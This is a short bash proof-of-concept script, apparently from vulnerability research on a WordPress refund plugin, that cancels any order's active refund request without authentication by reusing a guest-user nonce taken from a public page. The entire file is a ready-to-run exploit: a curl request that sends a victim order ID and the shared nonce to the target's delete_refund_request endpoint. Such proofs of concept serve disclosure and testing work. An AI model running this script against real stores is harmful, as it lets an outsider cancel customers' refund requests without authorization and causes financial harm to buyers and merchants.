#!/usr/bin/env bash
# FR-04 (PRO) — unauthenticated cancellation of any order's active refund request.
# The 'cancel_refund' nonce is a GUEST (uid 0) nonce: identical for all anonymous visitors,
# obtainable from any public request page. No cookies are used in the attack.
set -euo pipefail
TARGET=${TARGET:-http://localhost:8088}
VICTIM_ORDER=${VICTIM_ORDER:-12}
NONCE=${NONCE:?set NONCE to the uid-0 cancel_refund nonce (from any public request-in-progress page)}
curl -s -o /dev/null -w 'HTTP %{http_code} -> %{redirect_url}\n' --max-redirs 0 \
  "$TARGET/?delete_refund_request=$VICTIM_ORDER&_wpnonce=$NONCE"
